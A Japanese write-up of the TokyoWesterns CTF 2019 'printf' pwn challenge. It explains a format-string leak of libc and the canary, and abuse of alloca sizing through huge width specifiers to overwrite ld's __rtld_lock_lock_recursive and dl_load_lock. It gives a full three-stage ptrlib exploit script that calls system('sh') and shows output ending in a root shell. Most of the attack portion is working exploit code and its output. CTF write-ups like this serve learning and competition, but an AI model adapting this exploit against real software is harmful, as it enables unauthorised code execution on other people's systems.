# [pwn 216pts] printf - TokyoWesterns CTF 5th 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f printf
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               3       printf
```
IDAで解析すると、2回printfに入力が突っ込まれるのでFSBがあります。しかし、どちらも自作のprintf関数が使われています。printf関数は流石に解析が難しいですが、ざっと読むとx,c,sあたりが使える他l,lh,llhによるサイズの変更もできそうです。また、最初にフォーマット文字列を解析し、必要なバッファのサイズを計算してsizeに足していきます。最後まで解析すると、sizeに1を足してallocaでバッファを確保します。そして同じようにフォーマット文字列を解析してバッファに書き込んでいき、最後にputsで出力します。
とりあえずまずはlibcのアドレスをリークしましょう。

```python
sock.recvline()
sock.sendline("%lx.%lx." * 24)
sock.recvline()
x = sock.recvline().split(b".")
libc_base = int(x[42], 16) - libc.symbol("__libc_start_main") - delta
canary = int(x[40], 16)
logger.info("libc = " + hex(libc_base))
logger.info("canary = " + hex(canary))
```

直接引数を指定できない点を除けばこれは普通のFSBと同じです。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=27656)
[+] <module>: libc = 0x7fcc1f462000
[+] <module>: canary = 0xd1c04bf8da7bb500
```

さて、問題は%nが使えないので書き込めないということです。適当に試すと気になる動作がありました。
```
$ ./printf
What's your name?
%9999999999999x
Hi, 
Segmentation fault (コアダンプ)
```

%3735928559xとしてallocaの部分で止めてみましょう。すると、sizeが0xdeadbef0になっていました。つまり、%の後の数字の分だけsizeを確保してくれるようです。allocaではsizeを適当にalignした後`sub rsp, rax`するので、これを使えばrspを自由な場所に調整できそうです。
しかし、raxが負の値だとexitされてしまいます。したがって、リターンアドレスを書き換えるようなことはできないので、今回はlibcの中の何かを書き換えることでシェルを取りましょう。

`__exit_funcs`を書き換えればいっかなーと思ったのですが、最近のlibcは`PTR_DEMANGLE`とかいうのでポインタがXORされてるので今回は書き換えられないです。ldの方なのであまり使いたくないですが、今回は`__rtld_lock_lock_recursive`を使います。

これで無事にRIPをコントロールできるのですが、条件的にone gadgetが実行できません。ということで、一回目は`_start`のアドレスを書いておき、二週目でrdiにあたる`GL(dl_load_lock)`を`/bin/sh`にセットし、三週目で`system`関数を`__rtld_lock_lock_recursive`に代入しましょう。

```python
from ptrlib import *

#"""
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
#sock = Socket("printf.chal.ctf.westerns.tokyo", 10001)
libc = ELF("./my_libc-2.29.so")
ld = ELF("./my_ld-2.29.so")
sock = Socket("localhost", 9999)
delta = 0xeb + 8
dl_load_lock = ld.symbol("_rtld_global") + 2312
rtld_lock_lock_recursive = ld.symbol("_rtld_global") + 3848
ld_offset = 0x1fa000
"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
ld = ELF("/lib/x86_64-linux-gnu/ld-2.27.so")
sock = Process("./printf")
delta = 0xe7
dl_load_lock = ld.symbol("_rtld_global") + 2312
rtld_lock_lock_recursive = ld.symbol("_rtld_global") + 3840
ld_offset = 0x3f1000
#"""

## Stage 1
# leak info
sock.recvline()
sock.sendline("%lx.%lx." * 24)
sock.recvline()
x = sock.recvline().split(b".")
addr_stack = int(x[39], 16)
proc_base = int(x[41], 16) - 0x2a40
libc_base = int(x[42], 16) - libc.symbol("__libc_start_main") - delta
ld_base = libc_base + ld_offset
logger.info("stack = " + hex(addr_stack))
logger.info("proc = " + hex(proc_base))
logger.info("libc = " + hex(libc_base))
logger.info("ld = " + hex(ld_base))
# overwrite __rtld_lock_lock_recursive
payload = str2bytes('%{}x'.format(addr_stack - ld_base - rtld_lock_lock_recursive - 0x388))
payload += p64(proc_base + 0x10d0) # _start
sock.recvline()
sock.sendline(payload)
sock.recvline()

## Stage 2
sock.recvline()
sock.sendline("Hello, World!")
sock.recvline()
# overwrite dl_load_lock
payload = str2bytes('%{}x'.format(addr_stack - ld_base - dl_load_lock - 0x388 - 0x190))
payload += b"sh;sh;" # /bin/sh
sock.recvline()
sock.sendline(payload)
sock.recvline()

## Stage 3
sock.recvline()
sock.sendline("Hello, World!")
sock.recvline()
# overwrite __rtld_lock_lock_recursive
payload = str2bytes('%{}x'.format(addr_stack - ld_base - rtld_lock_lock_recursive - 0x388 - 0x190 - 0x190))
payload += p64(libc_base + libc.symbol("system")) # system
sock.recvline()
sock.sendline(payload)
sock.recvline()
sock.recvline()
sock.recvline()

sock.interactive()
```

ld-linuxの問題で本番環境では動きませんでしたが、直すの面倒なのでこれでいいことにします。
```
$ python solve.py 
[+] __init__: Successfully connected to localhost:9999
[+] <module>: stack = 0x7fff2f8e0ec0
[+] <module>: proc = 0x56314e1f1000
[+] <module>: libc = 0x7f54a607b000
[+] <module>: ld = 0x7f54a6275000
[ptrlib]$ whoami
root
```

[追記] libc-2.29は`_IO_jump_t`が書き込みできるようになっているらしく、それを使うともっとちゃんと解けるみたいです。

# 感想
解き方はいろいろありますね。
